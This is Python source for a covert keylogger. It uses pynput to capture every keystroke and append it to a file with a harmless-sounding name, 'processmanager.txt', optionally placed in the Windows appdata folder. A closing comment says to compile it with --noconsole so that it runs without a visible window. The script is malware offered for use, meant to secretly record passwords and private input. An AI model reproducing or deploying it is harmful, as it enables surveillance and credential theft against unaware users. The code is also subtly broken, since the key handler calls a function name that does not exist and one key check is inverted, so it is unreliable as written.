import os
from pynput.keyboard import Listener

keys = []
count = 0
#path = os.environ['appdata'] + '\\processmanager.txt' #If we want to run in Windows
path = 'processmanager.txt' #If we want to run in Linux

def on_press(key): #Processes keys one-by-one
    global keys, count

    keys.append(key) #Adds to keys list
    count += 1

    if count >= 1:  #Writes to file and clears list to prevent duplicate keys
        count = 0
        write_file(keys)
        keys = []

def write_keys(keys):
    with open(path, 'a') as f: #opening for appending as file to create our list of key presses
        for key in keys: #iterates through keys list
            k = str(key).replace("'", "") #takes strings from keys list and removes unnecessary single quotes
            if k.find('backspace') > 0:#This section (lines 24-33) are for taking the output of special keys and altering them for clarity
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')#----------------------------------------------------------------------
            elif k.find('Key'):
                f.write(k)

with Listener(on_press=on_press) as Listener: #Listens for key presses
    Listener.join()

####must have pyinstaller compile on Windows with --onefile and --noconsole